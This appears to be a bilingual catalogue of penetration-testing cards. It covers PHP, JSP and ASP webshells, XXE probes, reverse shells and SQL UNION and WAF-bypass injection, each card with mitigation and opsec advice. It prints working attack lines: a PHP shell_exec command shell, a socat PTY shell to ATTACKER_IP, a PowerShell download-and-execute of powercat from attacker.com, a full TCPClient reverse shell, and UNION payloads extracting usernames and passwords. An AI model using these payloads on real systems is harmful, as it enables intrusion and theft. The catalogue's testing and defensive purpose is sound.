opsecTips.zh: 测试内容只能是无害文本或服务器端固定标记，不上传 WebShell 或命令执行代码。
opsecTips.en: Test content must be harmless text or a fixed server-side marker; do not upload webshell or command-execution code.

opsecTips.zh: 每个测试文件完成后立即删除，并确认 CDN、对象存储和备份中无残留。
opsecTips.en: Delete each test file immediately afterward and verify no residue remains in CDN, object storage, or backups.

name.zh: PHP 服务端命令脚本变体

description.zh: 按 system、shell_exec、passthru、eval、assert、回调、反射与短标签整理 PHP 服务端命令脚本，用于检测上传或模板内容是否被 PHP 解释。
description.en: Organizes PHP command scripts using system, shell_exec, passthru, eval, assert, callbacks, reflection, and short tags to test whether uploaded or templated content is interpreted by PHP.

prerequisites.zh: 隔离实例存在可能将用户内容交给 PHP 处理器的上传或模板数据流
prerequisites.en: An isolated instance has an upload or template flow that may reach a PHP handler.

prerequisites.zh: 使用无害固定标记替代系统命令并可查看处理器日志
prerequisites.en: Harmless fixed markers replace system commands and handler logs are available.

title.zh: PHP 命令脚本样例

execution.command: '.shell_exec($_GET["cmd"]).''; ?> invoke($_GET["cmd"]); ?>

description.zh: 原始行用于识别危险函数和历史 PHP 变体。实际验证必须把所有命令/参数替换为返回固定字符串的无害表达式，并一次只使用与目标 PHP 版本匹配的一行。
description.en: The original lines identify dangerous functions and historical PHP variants. For validation, replace every command or parameter with a harmless fixed-string expression and use only one line compatible with the target PHP version.

overview.zh: 这些 PHP 片段覆盖直接系统命令、动态求值和回调混淆，部分 API 只存在于旧版本。卡片目标是确认用户内容被 PHP 处理器解释，而不是提供一套要逐条部署的 WebShell；静态下载或源代码显示是不同结果。
overview.en: These PHP fragments cover direct system commands, dynamic evaluation, and callback obfuscation, with some APIs limited to legacy versions. The goal is to prove that user content is interpreted by PHP, not to deploy every webshell. Static download or source display is a different result.

vulnerability.zh: 根因通常是上传目录可执行、模板/缓存文件被写入 Web 根目录，或业务代码把请求参数交给 eval、assert、危险回调和命令函数。攻击面同时包含文件落地位置、PHP 处理器映射和动态函数调用。
vulnerability.en: Typical causes are executable upload storage, template or cache files written under the web root, or request parameters reaching eval, assert, dangerous callbacks, and command functions. The attack surface combines file placement, PHP handler mapping, and dynamic invocation.

exploitation.zh: 先用纯文本标记上传并确认静态行为，再在隔离实例选择一个与运行版本匹配的最小 PHP 标记脚本，固定输出随机字符串且不接收外部命令。关联处理器日志和进程遥测。只有服务端生成标记证明解释；文件可访问、语法错误或源码回显不等于 RCE。
exploitation.en: Upload a plain-text marker and confirm static behavior, then choose one minimal version-compatible PHP marker script in isolation that emits a random constant and accepts no external command. Correlate handler and process logs. Only server-generated marker output proves interpretation; accessibility, syntax errors, or source reflection do not equal RCE.

mitigation.zh: 上传文件使用随机对象 ID 存在 Web 根目录外且不可执行，下载经固定处理器返回。移除 eval/assert 和动态回调，禁用不需要的危险函数，升级受支持 PHP，限制 Web 账户权限，并监控上传目录出现 PHP 标签或子进程。
mitigation.en: Store uploads under random object IDs outside the web root with execution disabled and serve them through a fixed download handler. Remove eval, assert, and dynamic callbacks, disable unnecessary dangerous functions, run supported PHP, constrain the web identity, and monitor upload storage for PHP tags or child processes.

title.zh: 确认文件存储与 PHP 映射

description.zh: 记录纯文本上传的规范文件名、真实路径、Content-Type 和处理器。
description.en: Record canonical filename, disk path, Content-Type, and handler for a plain-text upload.

title.zh: 选择单一无害 PHP 标记

description.zh: 按目标版本选择一行，把命令入口替换为固定随机字符串输出，并在隔离实例访问。
description.en: Choose one version-matching line, replace command input with fixed random-string output, and request it in isolation.

title.zh: 确认服务端解释而非静态返回
title.en: Confirm server interpretation rather than static serving

description.zh: 匹配固定标记、PHP 处理器日志与进程行为，排除源码下载、前端渲染和缓存。
description.en: Match the fixed marker, PHP handler logs, and process behavior while excluding source download, frontend rendering, and caching.

title.zh: 迁移不可执行存储并清理
title.en: Move to nonexecutable storage and clean up

description.zh: 删除测试文件，修复存储和动态调用后重放静态文件与标记脚本，确认脚本不再解释。
description.en: Remove test files, fix storage and dynamic calls, and replay static files and marker scripts to confirm scripts are no longer interpreted.

analysis.zh: 根据最终处理结果分级：静态源码泄露、PHP 标记解释、动态请求求值和系统子进程是递增的不同风险。不能因为文件扩展名或危险函数文本存在就假定执行。
analysis.en: Classify by outcome: static source disclosure, PHP marker interpretation, dynamic request evaluation, and system child process are progressively different risks. Filename or dangerous-function text alone does not establish execution.

opsecTips.zh: 不得把原始命令型片段直接部署；只使用固定输出、无外部参数的最小标记脚本。
opsecTips.en: Never deploy the original command-capable fragments; use only a minimal fixed-output marker with no external parameters.

opsecTips.zh: 验证后立即删除上传文件、清理 opcode/cache/CDN，并核对没有残留进程或访问 URL。
opsecTips.en: Immediately remove uploads, clear opcode, application, and CDN caches, and verify no process or reachable URL remains.

name.zh: JSP Runtime.exec 服务端执行边界

description.zh: 使用两条 JSP scriptlet 验证用户可控页面是否由 Servlet 容器编译，以及请求参数是否进入 Runtime.exec；第二条还依赖 Apache Commons IO 回显进程输出。
description.en: Uses two JSP scriptlets to test whether user-controlled pages are compiled by a servlet container and whether request parameters reach Runtime.exec; the second also depends on Apache Commons IO to return process output.

prerequisites.zh: 隔离目标明确把测试文件映射到 JSP/Servlet 编译器，并可查看生成类与容器日志
prerequisites.en: The isolated target explicitly maps the test file to a JSP or servlet compiler, and generated classes and container logs are observable.

prerequisites.zh: 原始 cmd 参数替换为固定 marker-helper，且 Java 服务身份只能启动这一无副作用程序
prerequisites.en: The original cmd parameter is replaced by a fixed marker-helper, and the Java service identity can launch only this side-effect-free program.

title.zh: JSP Runtime.exec Scriptlet

description.zh: 原行仅作追溯；验证版本必须去除任意请求命令，只调用签名 marker-helper。第二行还需先确认 Commons IO 在应用类路径中。
description.en: The originals are retained for traceability only; the validation version must remove arbitrary request commands and invoke only the signed marker-helper. Confirm Commons IO is on the application classpath before using the second line.

overview.zh: JSP 首次请求通常会被翻译并编译为 Servlet。第一行启动进程但不回显，第二行读取子进程标准输出且依赖 Commons IO；两者属于同一 Java 运行时边界，不应与 ASP/.NET 混合。
overview.en: A JSP is normally translated and compiled into a servlet on first request. The first line starts a process without returning output, while the second reads child stdout and requires Commons IO; both share one Java runtime boundary and should not be mixed with ASP or .NET.

vulnerability.zh: 若用户可写内容进入可执行 JSP 路径，或业务 JSP 把请求参数交给 Runtime.exec，数据可跨越为 JVM 子进程。文件上传成功、JSP 源码可见或编译错误都不能证明进程创建。
vulnerability.en: If user-writable content reaches an executable JSP path or a business JSP passes request parameters to Runtime.exec, data can cross into a JVM child process. Upload success, visible JSP source, and compilation errors do not prove process creation.

exploitation.zh: 先部署只输出随机常量的 JSP 证明容器编译，再将 Runtime.exec 参数固定为一次性 marker-helper 并选择一行单次请求。阳性要求请求、生成 Servlet、Java 父进程、帮助程序子进程与标记输出关联；无回显的第一行需依赖进程审计。
exploitation.en: First deploy a JSP that prints only a random constant to prove container compilation, then pin Runtime.exec to a one-time marker-helper and request one line once. A positive correlates the request, generated servlet, Java parent, helper child, and marker output; the first nonreflective line requires process audit.

mitigation.zh: 上传和用户内容存储在 Web 根目录外且禁用 JSP 映射，不允许动态编译不可信页面；移除请求驱动的 Runtime.exec，使用固定 Java API，并限制容器子进程、文件与网络权限。
mitigation.en: Store uploads and user content outside the web root with JSP mapping disabled, prohibit dynamic compilation of untrusted pages, remove request-driven Runtime.exec, use fixed Java APIs, and restrict container child-process, file, and network permissions.

title.zh: 确认 JSP 编译与类路径

description.zh: 记录页面映射、生成 Servlet、容器身份，并检查第二行所需 Commons IO。
description.en: Record page mapping, generated servlet, container identity, and the Commons IO dependency required by the second line.

title.zh: 固定 Helper 后单行请求
title.en: Request one line after pinning the helper

description.zh: 移除外部 cmd 参数，只保留一次 marker-helper 调用，并为请求绑定唯一令牌。
description.en: Remove external cmd input, retain one marker-helper invocation, and bind a unique token to the request.

title.zh: 关联 Servlet 与子进程
title.en: Correlate the servlet and child process

description.zh: 匹配容器日志、生成类、父子 PID 和输出，排除静态返回或其他任务进程。
description.en: Match container logs, generated class, parent-child PIDs, and output while excluding static serving and unrelated jobs.

title.zh: 关闭 JSP 映射并清理
title.en: Disable JSP mapping and clean up

description.zh: 修复后重放静态上传和标记 JSP，确认用户内容不再编译，并删除生成类与帮助程序。
description.en: After remediation replay a static upload and marker JSP, confirm user content is no longer compiled, and delete generated classes and the helper.

analysis.zh: 完整证据是目标 JSP 被容器编译，生成的 Servlet 以 Java 服务身份启动受控 marker-helper。页面可访问、JSP 标签被识别、编译异常或仅有固定文本均不足；第一行没有输出时必须有进程遥测。
analysis.en: Complete evidence is the target JSP being compiled by the container and its generated servlet launching the controlled marker-helper as the Java service identity. Page accessibility, recognized JSP tags, compilation errors, and fixed text alone are insufficient; the first line requires process telemetry because it returns no output.

opsecTips.zh: 只允许签名 marker-helper 且限制一次子进程；不得向 Runtime.exec 传入用户命令
opsecTips.en: Permit only the signed marker-helper and one child process; never pass a user command to Runtime.exec.

opsecTips.zh: 验证后删除 JSP、生成 Servlet/class、工作目录缓存和帮助程序，并确认 URL 失效
opsecTips.en: After validation delete the JSP, generated servlet or class, work-directory caches, and helper, and confirm the URL is gone.

name.zh: ASP/.NET 进程与动态求值边界
name.en: ASP and .NET Process and Dynamic-Evaluation Boundary

description.zh: 使用两条 ProcessStartInfo 片段和两条 eval 形态验证 Microsoft Web 运行时是否将请求数据交给系统进程或动态脚本求值。
description.en: Uses two ProcessStartInfo fragments and two eval forms to test whether a Microsoft web runtime passes request data into an operating-system process or dynamic script evaluation.

prerequisites.zh: 已确认具体处理器是 ASP.NET、JScript.NET 或其他支持对应语法的 Microsoft 服务端运行时
prerequisites.en: The exact handler is confirmed as ASP.NET, JScript.NET, or another Microsoft server runtime supporting the selected syntax.

prerequisites.zh: cmd.exe、PowerShell 和 eval 输入均替换为固定常量或 marker-helper，且应用池子进程可审计
prerequisites.en: cmd.exe, PowerShell, and eval inputs are replaced by a fixed constant or marker-helper, and application-pool child processes are auditable.

title.zh: ASP/.NET 进程与 Eval 片段
title.en: ASP and .NET Process and Eval Fragments

description.zh: 每行需先匹配实际语言和处理器；执行版本不得接受 cmd 参数，只允许固定标记输出。后两条不是标准 C# 语句，必须由已确认支持 eval 的动态运行时解释。
description.en: Match each line to the actual language and handler first; the execution version must accept no cmd input and may emit only a fixed marker. The final two are not standard C# statements and require a confirmed dynamic runtime that supports eval.

overview.zh: ProcessStartInfo 行属于 .NET 进程启动边界，eval 行依赖具体动态脚本宿主；它们共享 Microsoft Web 部署与应用池权限，但语法不能跨运行时互换。测试前必须用编译或解析结果确定每行归属。
overview.en: The ProcessStartInfo lines exercise .NET process creation, while eval depends on a specific dynamic script host. They share Microsoft web deployment and application-pool permissions, but their syntax is not interchangeable across runtimes. Compilation or parsing must classify each line before testing.

vulnerability.zh: 若请求参数进入 ProcessStartInfo 参数拼接或服务端 eval，攻击者可从数据边界进入进程或动态代码。处理器映射、语言选择和应用池权限共同决定影响；语法错误、源码回显或 Base64 解码成功不证明执行。
vulnerability.en: If request parameters reach ProcessStartInfo argument concatenation or server-side eval, data may cross into a process or dynamic code. Handler mapping, language selection, and application-pool privileges determine impact; syntax errors, source reflection, and successful Base64 decoding do not prove execution.

exploitation.zh: 先按运行时编译或 lint 四行，只选择语法有效的一行并将外部输入替换为随机常量/marker-helper。记录处理器、应用池身份、父子 PID 与响应。阳性要求服务端求值固定标记或启动唯一帮助程序；客户端 eval 和错误差异排除。
exploitation.en: Compile or lint all four lines for the target runtime, choose one syntactically valid line, and replace external input with a random constant or marker-helper. Record handler, application-pool identity, parent-child PIDs, and response. A positive requires server-side evaluation of the marker or launch of the sole helper; client-side eval and error differences are excluded.

mitigation.zh: 移除请求驱动的 ProcessStartInfo 和服务端 eval，改用固定业务 API 与参数数组；上传/模板目录禁用动态处理器，应用池采用最小权限和进程启动限制。回归覆盖所有处理器映射。
mitigation.en: Remove request-driven ProcessStartInfo and server-side eval, use fixed business APIs and argument arrays, disable dynamic handlers in upload and template storage, and constrain application-pool privileges and process creation. Regress every handler mapping.

title.zh: 按处理器分类四条语法
title.en: Classify all four forms by handler

description.zh: 记录扩展名、编译器/脚本宿主、语言版本和应用池身份，保留语法结果。
description.en: Record extension, compiler or script host, language version, and application-pool identity and preserve syntax results.

title.zh: 改写为固定标记后单行验证
title.en: Validate one line after rewriting to a fixed marker

description.zh: 去除请求命令和危险可执行文件，只提交与当前运行时匹配的一行。
description.en: Remove request commands and dangerous executables and submit only one line matching the current runtime.

title.zh: 区分求值与进程创建

description.zh: 关联服务端标记、处理器日志和父子 PID，明确动态表达式与系统进程的不同证据。
description.en: Correlate server marker, handler logs, and parent-child PIDs and distinguish dynamic expression evidence from OS process evidence.

title.zh: 移除动态入口并回收应用池
title.en: Remove dynamic entry points and recycle the pool

description.zh: 修复后重放静态内容与四个负向输入，确认不再求值或启动进程，并清理缓存。
description.en: After remediation replay static content and all four negative inputs, confirm no evaluation or process launch, and clear caches.

analysis.zh: 结论必须按运行时分层：编译/解析成功、服务端固定表达式求值、ProcessStartInfo 启动帮助程序是不同证据。后两条在标准 C# 中无效，只有目标动态宿主明确支持时才可测试，不能因字符串含 eval 就认定 RCE。
analysis.en: Conclusions must be layered by runtime: successful compilation or parsing, server-side evaluation of a fixed expression, and ProcessStartInfo launching the helper are distinct evidence. The final two lines are invalid in standard C# and may be tested only when the target dynamic host explicitly supports them; the word eval does not establish RCE.

opsecTips.zh: 禁止启动原始 cmd.exe/PowerShell；进程型行只允许一次签名 marker-helper，eval 型行只返回常量
opsecTips.en: Do not launch the original cmd.exe or PowerShell; process lines may invoke one signed marker-helper and eval lines may return only a constant.

opsecTips.zh: 验证后删除页面、动态编译产物和帮助程序，回收应用池并确认无残留子进程
opsecTips.en: After validation delete pages, dynamic compilation artifacts, and the helper, recycle the application pool, and confirm no child remains.

name.zh: XML 实体文件读取与带外探测
name.en: XML Entity File Read and Out-of-Band Probes

description.zh: 使用本地外部实体引用、实体消费节点和外部 DTD，验证 XML 解析器是否允许文件解析或带外网络加载。
description.en: Uses a local external entity declaration, an entity-consuming node, and an external DTD to test whether an XML parser permits file resolution or out-of-band network loading.

prerequisites.zh: 目标端点或异步任务实际解析 XML
prerequisites.en: The endpoint or asynchronous job actually parses XML.

prerequisites.zh: 隔离环境提供无敏感标记文件和自有 HTTPS/DNS 回连服务
prerequisites.en: The isolated environment provides a nonsensitive marker file and controlled HTTPS or DNS callback service.

title.zh: 本地实体与外部 DTD 片段
title.en: Local Entity and External DTD Fragments

description.zh: 前三行分别是声明、消费节点和外部 DTD 探针，需按目标 XML 结构组合；将系统文件和外部域替换为隔离标记资源。
description.en: The lines are a declaration, consuming node, and external-DTD probe and must be composed for the target XML structure; replace system files and external domains with isolated marker resources.

overview.zh: 该三行原本被错误放在 WebShell 集合中，实际属于 XML 外部实体。第一行声明本地实体，第二行在业务节点消费它，第三行请求外部 DTD；应根据目标 XML 架构组合，不能把三行视为三个可独立执行命令。
overview.en: These lines were misplaced in a webshell collection and are XML external-entity probes. The first declares a local entity, the second consumes it in a business node, and the third requests an external DTD. Compose them for the target schema rather than treating them as standalone commands.

vulnerability.zh: 根因是解析器允许 DTD、外部通用实体或外部子集，并以应用权限访问文件或网络。异步文档处理器也可能在上传成功后才触发，因此证据必须关联实际解析任务，而非只看入口响应。
vulnerability.en: The cause is a parser allowing DTDs, external general entities, or external subsets with application filesystem or network privileges. An asynchronous document processor may trigger after upload, so evidence must correlate the real parse job rather than only the ingress response.

exploitation.zh: 先提交无 DOCTYPE 的合法 XML 基线，再用测试标记文件构造本地实体文档，或用一次性自有域构造外部 DTD。记录任务 ID、解析日志、文件访问与回连。标记输出或唯一回连才成立；500、上传成功和规则命中不是 XXE 证据。
exploitation.en: Submit valid XML without a DOCTYPE, then build a local-entity document using a test marker or an external-DTD document using a one-time controlled domain. Record job ID, parser logs, file access, and callbacks. Marker output or a unique callback is evidence; 500, upload success, or a rule hit is not.

mitigation.zh: 在所有同步与异步解析器禁用 DOCTYPE、外部实体、外部子集与 XInclude，采用安全预设并限制文件系统和出站网络。对 XML 派生格式采用同样策略，验证解析库配置并保留回显/盲 XXE 回归样例。
mitigation.en: Disable DOCTYPE, external entities, external subsets, and XInclude in every synchronous and asynchronous parser, use secure presets, and restrict filesystem and egress. Apply the same policy to XML-derived formats, verify parser configuration, and retain in-band and blind XXE regression cases.

title.zh: 确认 XML 解析任务

description.zh: 定位同步或异步解析组件、输入架构和日志关联字段。
description.en: Identify the synchronous or asynchronous parser, input schema, and log-correlation field.

title.zh: 组合并提交受控实体文档
title.en: Compose and submit a controlled entity document

description.zh: 按目标架构组合声明与消费节点，或使用一次性外部 DTD，并替换为标记资源。
description.en: Compose declaration and consuming node for the target schema or use a one-time external DTD, replacing targets with markers.

title.zh: 关联文件或带外证据

description.zh: 匹配标记输出、文件审计或唯一回连与解析任务，排除应用其他组件请求。
description.en: Match marker output, file audit, or unique callback to the parse job, excluding requests from other application components.

title.zh: 关闭实体解析并回归

description.zh: 修复所有解析器后重放恶意与正常 XML，确认实体不解析且业务数据仍可处理。
description.en: After fixing every parser, replay malicious and normal XML to confirm no entity resolution while business data still parses.

analysis.zh: 本地读取与带外 XXE 证据不同：前者依赖受控标记进入输出或文件审计，后者依赖一次性域与任务关联。通用解析错误不能确认任何一种。
analysis.en: In-band and out-of-band XXE require different evidence: marker output or file audit for the former, and a one-time domain correlated to the parse job for the latter. A generic parse error confirms neither.

opsecTips.zh: 将 `/etc/passwd` 和公共回连域替换为本地测试标记与自有一次性域。
opsecTips.en: Replace /etc/passwd and public callback domains with a local test marker and controlled one-time domain.

opsecTips.zh: 限制文档大小、实体数量与等待窗口，防止资源耗尽和长期回连监听。
opsecTips.en: Limit document size, entity count, and observation window to prevent resource exhaustion and long-lived listeners.

name.zh: Bash 反向通道命令变体

description.zh: 三条均依赖 Bash `/dev/tcp` 与交互 Shell，应归入 Bash 专用工具而非 Payload。授权验证时改为向隔离监听器发送一次固定标记后退出。
description.en: All three depend on Bash /dev/tcp and an interactive shell and therefore belong in the Bash-specific tool rather than payloads. For authorized validation, rewrite them to send one fixed marker to an isolated listener and exit.

name.zh: Perl Socket 反向通道

description.zh: 完整 Perl Socket/文件描述符生成命令，运行时专属于 Perl 工具。实际演练改为单次标记连接，不启动 `/bin/sh -i`。
description.en: A complete Perl Socket and file-descriptor generator command that belongs to the Perl runtime tool. Replace it with a one-shot marker connection during testing and do not start /bin/sh -i.

name.zh: Python 2/3 Socket 反向通道

description.zh: 两行分别调用 Python 2/3 的 socket、dup2 与 subprocess，应作为 Python 工具版本变体维护。验证时去除 Shell，仅发送固定标记。
description.en: The lines invoke Python 2 and 3 socket, dup2, and subprocess APIs and should be maintained as Python tool variants. Remove the shell and send only a fixed marker during validation.

name.zh: PHP CLI Socket 反向通道

description.zh: 该行是 PHP CLI `fsockopen` 与 `exec` 组合生成命令，归 PHP 反向通道工具。测试版本只建立短连接并发送标记，不启动 Shell。
description.en: This is a PHP CLI generator combining fsockopen and exec and belongs in the PHP reverse-channel tool. The test version should establish only a short marker connection and launch no shell.

name.zh: Ruby TCPSocket 反向通道

description.zh: 该生成命令依赖 Ruby TCPSocket 与 exec，唯一归入 Ruby 反向通道工具。授权验证使用无副作用标记连接替换 `/bin/sh`。
description.en: This generator depends on Ruby TCPSocket and exec and belongs uniquely in the Ruby reverse-channel tool. Replace /bin/sh with a side-effect-free marker connection for authorized validation.

name.zh: Netcat、FIFO 与 Ncat 反向通道
name.en: Netcat, FIFO, and Ncat Reverse Channels

description.zh: 三行分别覆盖 nc -e、FIFO 兼容写法与 Ncat -e，均属于 Netcat 工具语法。验证时不得创建持久 FIFO 或 Shell，应改为一次标记传输并清理临时路径。
description.en: The lines cover nc -e, a FIFO-compatible form, and Ncat -e and all belong to Netcat tooling. Validation must not create a persistent FIFO or shell; rewrite to one marker transfer and clean temporary paths.

name.zh: Xterm X11 远程显示命令

description.zh: 当前库没有独立 X11 工具；该行是 Linux 已执行后的 Xterm DISPLAY 重定向，不是语言反向 Shell，因此最贴合 Linux 后渗透工具。验证仅可指向隔离 X Server，并在首次窗口事件后停止。
description.en: The library has no dedicated X11 tool. This line redirects Xterm DISPLAY after Linux execution and is not a language reverse shell, so Linux post-exploitation is the closest existing target. Point only to an isolated X server and stop after the first window event.

name.zh: Socat PTY 通道两端命令

commands.command:
socat file:`tty`,raw,echo=0 tcp-listen:4444
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:4444

description.zh: 两行分别配置 Socat 监听端和 PTY 连接端，属于通道工具手册而非业务 Payload。隔离验证应改为固定标记流、设置超时并禁止交互 Shell。
description.en: The lines configure Socat listener and PTY connector endpoints and belong in channel tooling rather than business payloads. Isolated validation should use a fixed marker stream with timeout and no interactive shell.

name.zh: Powercat 与 PowerShell TCP 通道

commands.command:
echo IEX(New-Object Net.WebClient).DownloadString("http://attacker.com:8442/powercat.ps1") | powershell -noprofile; powercat -c attacker.com -p 8443 -e cmd
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

description.zh: 两行是 Powercat 下载/连接和原生 TCPClient/iex 通道生成命令，唯一归入 PowerShell 反向工具。不得直接下载或执行；验证版本只连接隔离监听器发送标记并退出。
description.en: These are Powercat download or connection and native TCPClient or iex channel generators and belong uniquely in the PowerShell reverse tool. Do not download or execute them directly; the validation version connects only to an isolated listener, sends a marker, and exits.

name.zh: UNION 提取与 SQL 词法编码变体
name.en: UNION Extraction and SQL Lexical Encoding Variants

description.zh: 使用注释、换行、垂直制表、双重编码、大小写和括号变体验证 UNION 查询在多层规范化后的语义。
description.en: Uses comments, line breaks, vertical tabs, double encoding, case changes, and parentheses to test UNION query semantics after multilayer normalization.

prerequisites.zh: 输入可能进入支持 UNION 的关系型数据库查询
prerequisites.en: Input may enter a relational query that supports UNION.

prerequisites.zh: 使用只含测试数据的数据库副本并可审计最终 SQL
prerequisites.en: A database copy with test-only data and auditable final SQL is available.

title.zh: UNION 与编码执行样例

execution.command:
id2='union all select * from users--
%C0%80'+union+select+col1,col2,col3+from+table+--+
<string>’ union select current_user, 2#</string>
0 union/**/select 1,version(),@@datadir
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201

description.zh: 按已确认数据库方言逐条应用到测试查询，并把表、列和用户目标改为测试对象；记录应用解码后 SQL 与结果列对齐。
description.en: Apply lines individually for the confirmed dialect, replace table, column, and user targets with test objects, and record decoded SQL and result-column alignment.

title.zh: 边界规范化复测集合

wafBypass.command:
id2='union all select * from users--
%C0%80'+union+select+col1,col2,col3+from+table+--+
<string>’ union select current_user, 2#</string>
0 union/**/select 1,version(),@@datadir
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201
0 union(select 1,username,password from(users))
0 union(select 1,@@hostname,@@datadir)
uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29
?id=‘-sqlite_version() UNION SELECT password FROM users --

description.zh: 保留原集合中的全部 UNION 复测行，用于对比边界和数据库的解码/分词；它们不是通用 WAF 绕过保证。
description.en: Preserves every original UNION retest line for comparing edge and database decoding or tokenization; the lines are not a universal WAF-bypass guarantee.

overview.zh: UNION 注入把攻击者选择的结果集与原查询合并。词法变体用于检测代理、框架和数据库对空白、注释和编码的解释差异；确认必须看到测试列进入实际数据库结果，而不是只看到过滤器放行。
overview.en: UNION injection merges an attacker-selected result set with the original query. Lexical variants test proxy, framework, and database disagreement over whitespace, comments, and encoding. Confirmation requires test columns in the database result, not merely filter acceptance.

vulnerability.zh: 根因是不可信输入被拼接进查询结构，而安全控制依赖原始字符串匹配。应用和数据库在额外解码、注释处理或空白折叠后恢复 UNION/SELECT 语义，参数与查询语法边界被突破。
vulnerability.en: The cause is untrusted input concatenated into query structure while controls rely on raw-string matching. Additional decoding, comment handling, or whitespace folding restores UNION and SELECT semantics and crosses the parameter-to-query boundary.

exploitation.zh: 先以常量测试列确定列数和回显位置，再只选择目标方言的一行并指向测试表。关联请求、规范化后的 SQL、数据库审计与固定标记结果。SQL 错误、WAF 告警或响应长度变化只是线索；测试数据进入结果才成立。
exploitation.en: Use constant test columns to establish count and reflection, then choose one dialect-matching line against a test table. Correlate request, normalized SQL, database audit, and fixed marker output. Errors, WAF alerts, or response-length changes are signals only; test data in the result confirms it.

mitigation.zh: 使用参数化查询和固定查询结构，动态排序/列名通过服务端允许列表映射。边界与应用统一解码一次但不依赖 WAF 修复注入，数据库账户最小权限，并将全部编码变体纳入回归。
mitigation.en: Use parameterized queries and fixed query structure, mapping dynamic sort or column names through server-side allowlists. Normalize once but do not rely on a WAF to fix injection, minimize database privileges, and retain every encoding variant in regression.

title.zh: 建立查询与列数基线

description.zh: 用合法测试查询和常量列记录最终 SQL、返回列与错误行为。
description.en: Use a valid test query and constant columns to record final SQL, returned columns, and error behavior.

title.zh: 提交方言匹配的词法变体

description.zh: 一次选择一行，替换为测试表和固定标记，并保留每层解码值。
description.en: Select one line at a time, point it to a test table and fixed marker, and retain decoded values at every layer.

attackChain.payload:
id2='union all select * from users--
%C0%80'+union+select+col1,col2,col3+from+table+--+
<string>’ union select current_user, 2#</string>
0 union/**/select 1,version(),@@datadir
1'UNION/*!0SELECT user,2,3,4,5,6,7,8,9/*!0from/*!0mysql.user/*-
amUserId=1 union select username,password,3,4 from users
%0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%20limit%201
%40%40new%20union%23sqlmapsqlmap...%0Aselect%201,2,database%23sqlmap%0A%28%29
%0Aselect%200x00%2C%200x41%20not%20like%2F*%2100000table_name*%2F%2C3%20from%20information_schema.tables%20limit%201

title.zh: 确认数据库结果合并

description.zh: 匹配测试标记、最终 SQL 与数据库审计，排除错误页、缓存和字符串回显。
description.en: Match test marker, final SQL, and database audit, excluding error pages, caching, and string reflection.

title.zh: 参数化并回归编码矩阵
title.en: Parameterize and regress the encoding matrix

description.zh: 固定查询结构后重放合法输入及全部词法变体，确认只有数据参数进入查询。
description.en: After fixing query structure, replay valid input and all lexical variants to confirm only data parameters reach the query.

analysis.zh: 区分边界放行、数据库语法接受和测试数据回显三个层级。只有最终 SQL 和结果证据能确认 UNION 注入，WAF 差异本身不能。
analysis.en: Separate edge acceptance, database syntax acceptance, and test-data output. Only final SQL and result evidence confirm UNION injection; a WAF differential alone does not.

opsecTips.zh: 所有 users、password、mysql.user 等目标替换为只含伪数据的测试表。
opsecTips.en: Replace users, password, mysql.user, and similar targets with test tables containing synthetic data.

opsecTips.zh: 每次仅尝试一个与已确认方言匹配的变体并限制响应行数。
opsecTips.en: Try one confirmed-dialect variant at a time and limit result rows.

name.zh: UNION CRLF 与注释分词编码
name.en: UNION CRLF and Comment Tokenization Encoding

description.zh: 使用 URL 编码 CRLF 与注释边界验证 WAF、框架和数据库是否把同一输入分词为不同的 UNION SELECT 查询。
description.en: Uses URL-encoded CRLF and comment boundaries to test whether the WAF, framework, and database tokenize the same input into different UNION SELECT semantics.

subCategory.zh: SQL 换行与注释规范化

prerequisites.zh: 目标查询使用 MySQL 类语法并经过至少一层 URL 解码
prerequisites.en: The target query uses MySQL-like syntax and passes through at least one URL-decoding layer.

prerequisites.zh: 测试数据库含固定伪数据并可查看规范化值和最终 SQL
prerequisites.en: A test database contains fixed synthetic data and exposes normalized input and final SQL for audit.

title.zh: 编码换行 UNION 样例

description.zh: 将 current_user 改为测试常量，单独提交并记录原始、一次解码、完全解码与数据库语句；不与 HTTP 头注入测试混用。
description.en: Replace current_user with a test constant, submit separately, and record raw, once-decoded, fully decoded, and database statements; do not combine it with HTTP header-injection testing.

title.zh: 边界分词复测

description.zh: 保留原集合中的重复复测行，修复后分别验证边界规范化和数据库分词。
description.en: Preserves the original duplicate retest line for separate post-fix verification of edge normalization and database tokenization.

overview.zh: 该行中的 `%0D%0A` 是 SQL 空白/换行编码，不是响应头 CRLF 注入。测试重点是解码后注释和换行是否恢复 UNION SELECT 语义，并让测试常量进入查询结果。
overview.en: The percent-encoded CRLF here represents SQL whitespace, not HTTP response-header injection. The test asks whether decoding restores UNION SELECT semantics through comments and newlines and returns a test constant.

vulnerability.zh: 根因是应用拼接 SQL，同时 WAF 在不同解码阶段按平面关键字匹配。数据库把编码后恢复的换行视为空白、井号视为注释，导致边界分词与数据库解析不一致。
vulnerability.en: The cause is SQL concatenation plus flat keyword matching at a different decoding stage. The database treats restored line breaks as whitespace and hash characters as comments, creating edge and database tokenization disagreement.

